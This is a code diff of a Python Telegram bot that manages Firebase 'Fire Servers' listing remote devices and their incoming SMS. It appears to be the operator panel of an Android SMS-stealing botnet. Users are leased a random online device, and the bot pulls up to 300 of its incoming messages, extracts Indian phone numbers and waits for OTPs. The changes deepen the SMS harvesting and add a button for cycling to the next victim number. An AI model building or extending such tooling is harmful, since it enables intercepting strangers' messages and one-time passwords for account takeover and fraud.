@@ -167,7 +167,6 @@ async def admin_home_msg(msg: Message):
         f"👥 <b>Total Users:</b> {len(db.load_data().get('users', {}))}\n\n"
         f"<b>Servers List:</b>\n"
     )
-    # 🔥 FIX: Owner ab proper Fire Server No, Label aur URL dekh sakta hai
     for i, stat in enumerate(stats_list):
         fb = stat["fb"]
         text += f"{i+1}. Fire Server {i+1} | {fb['label']} | <code>{fb['url']}</code>\n└ {stat['online']} ON / {stat['total']} Total\n\n"
@@ -190,7 +189,6 @@ async def admin_manage_fb(cq: CallbackQuery):
     
     kb = []
     for i, fb in enumerate(fbs):
-        short_url = fb['url'].split('//')[-1][:15]
         kb.append([
             InlineKeyboardButton(text=f"🔥 Fire {i+1} | {fb['label']}", callback_data=f"admin:viewfb:{i}"),
             InlineKeyboardButton(text="❌", callback_data=f"admin:rmfb:{i}")
@@ -224,10 +222,8 @@ async def admin_add_url_done(msg: Message, state: FSMContext):
             decoded = fbu.decode_panel_url(url)
             if decoded: url = decoded[0]
             
-        # 🔥 FIX: Agar user galti se label mein URL daal de toh default India kardo
         if "http" in label or "rtdb" in label or "firebase" in label:
             label = "India"
-            await msg.answer("⚠️ Label looked like a URL. Defaulted to 'India'.")
             
         data["firebases"].append({"url": url, "label": label, "auth": ""})
         db.save_data(data)
@@ -278,21 +274,25 @@ async def admin_viewfb(cq: CallbackQuery):
     idx = int(cq.data.split(":")[2])
     data = db.load_data()
     fb = data["firebases"][idx]
-    try: await cq.message.edit_text("🔄 Fetching devices...")
+    try: await cq.message.edit_text("🔄 Fetching online devices...")
     except TelegramBadRequest: pass
+    
     clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
     if not clients: return await cq.message.edit_text("❌ No devices found.", reply_markup=admin_kb())
     
-    # 🔥 FIX: Owner can see URL properly here
     text = f"📁 <b>Server:</b> {fb['label']}\n🔗 <b>URL:</b> <code>{fb['url']}</code>\n\n"
     count = 0
+    # 🔥 Sirf Online devices filter kiye hain
     for dev_id, dev_info in clients.items():
-        if isinstance(dev_info, dict):
-            status = "🟢 Online" if dev_info.get("status") else "🔴 Offline"
-            battery = dev_info.get("battery", "?")
-            text += f"🆔 <code>{dev_id}</code>\n{status} | 🔋 {battery}\n\n"
+        if isinstance(dev_info, dict) and dev_info.get("status") is True:
+            battery = str(dev_info.get("battery", "100")).replace("%", "")
+            text += f"🆔 <code>{dev_id}</code>\n🟢 Online | 🔋 {battery}%\n\n"
             count += 1
             if count >= 15: break
+            
+    if count == 0:
+        text += "No online devices currently."
+        
     kb = [[InlineKeyboardButton(text="🔙 Back", callback_data="admin:manage_fb")]]
     try: await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
     except TelegramBadRequest: pass
@@ -339,24 +339,31 @@ async def user_fb_server(cq: CallbackQuery):
     if idx >= len(fbs): return await cq.answer("Server not found.")
     fb = fbs[idx]
     uid = cq.from_user.id
-    try: await cq.message.edit_text("🔄 Fetching devices...")
+    try: await cq.message.edit_text("🔄 Fetching devices and deep SMS history...")
     except TelegramBadRequest: pass
+    
     clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
     if not clients: return await cq.answer("❌ No devices online on this Fire Server.", show_alert=True)
+    
     online_devices = [dev_id for dev_id, d in clients.items() if isinstance(d, dict) and d.get("status") is True]
     if not online_devices: return await cq.answer("❌ All devices are offline.", show_alert=True)
+    
     dev_id = random.choice(online_devices)
     dev_data = clients[dev_id]
-    url = f"{fb['url']}/messages/{dev_id}.json?limitToLast=100"
+    
+    # 🔥 Deep SMS History (300 msgs) fetch kar raha hai no. nikalne ke liye
+    url = f"{fb['url']}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=300"
     msgs_dict = await fbu.fetch_fb(url, fb.get("auth"))
     msgs = [v for k, v in msgs_dict.items() if isinstance(v, dict) and v.get("type") == "incoming"] if msgs_dict else []
+    
     best_nums = fbu.extract_best_numbers(dev_data, msgs)
     data["user_leases"][str(uid)] = {
         "dev_id": dev_id, "fb_url": fb["url"], "numbers": [n for n, c in best_nums],
         "expire_at": int(time.time()) + 3600
     }
     db.save_data(data)
-    nums_text = "\n".join([f"<code>+91{n}</code> ({c}%)" for n, c in best_nums]) if best_nums else "No numbers found in recent messages. (Waiting for new OTPs...)"
+    
+    nums_text = "\n".join([f"<code>+91{n}</code> ({c}% chance)" for n, c in best_nums]) if best_nums else "No numbers found in recent messages. (Waiting for new OTPs...)"
     battery = str(dev_data.get("battery", "100")).replace("%", "")
     if not battery or battery == "?": battery = "100"
     text = (
@@ -370,6 +377,7 @@ async def user_fb_server(cq: CallbackQuery):
     kb = [
         [InlineKeyboardButton(text="📋 Copy Rent ID", copy_text=CopyTextButton(text=dev_id))],
         [InlineKeyboardButton(text="⭐ Save to My Numbers", callback_data=f"star:{dev_id}")],
+        [InlineKeyboardButton(text="🔄 Next Number", callback_data=f"server:fb:{country}:{idx}")], # 🔥 Next Number Button
         [InlineKeyboardButton(text="🔙 Back", callback_data=f"country:{country}")]
     ]
     try: await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb), parse_mode="HTML")
